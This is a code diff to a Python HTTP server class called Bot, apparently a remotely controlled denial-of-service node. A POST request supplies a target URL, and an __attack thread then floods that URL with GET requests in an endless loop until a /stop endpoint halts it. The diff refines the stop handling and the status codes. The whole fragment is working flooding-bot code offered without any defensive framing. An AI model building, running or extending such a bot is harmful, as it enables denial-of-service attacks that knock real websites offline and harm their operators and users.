@@ -28,7 +28,10 @@ class Bot(BaseHTTPRequestHandler):
             self.__response_body(self.__status)
 
         elif self.path == '/stop':
-            self.send_response(200)
+            if self.status['action'] == 'Idle':
+                self.send_response(406)
+            else:
+                self.send_response(200)
             self.end_headers()
             self.stop.set()
 
@@ -41,7 +44,9 @@ class Bot(BaseHTTPRequestHandler):
             length = int(self.headers['Content-Length'])
             payload = json.loads(self.rfile.read(length).decode('utf-8'))
 
-            attack = threading.Thread(target=Bot.__attack, args=(self, payload['url'], self.stop))
+            self.stop.clear()
+
+            attack = threading.Thread(target=Bot.__attack, args=(self, payload['url']))
             attack.start()
             self.send_response(200)
         else:
@@ -58,15 +63,14 @@ class Bot(BaseHTTPRequestHandler):
         with self.lock:
             return self.status
 
-    def __attack(self, url, stop: threading.Event):
+    def __attack(self, url):
         with self.lock:
             self.status['action'] = "Attacking"
             self.status['targets'].append(url)
 
-        while not stop.is_set():
+        while not self.stop.is_set():
             print(f"Request sent to {url}, status code:{requests.get(url).status_code}")
 
-        stop.clear()
         with self.lock:
             self.status['action'] = "Idle"
             self.status['targets'].clear()
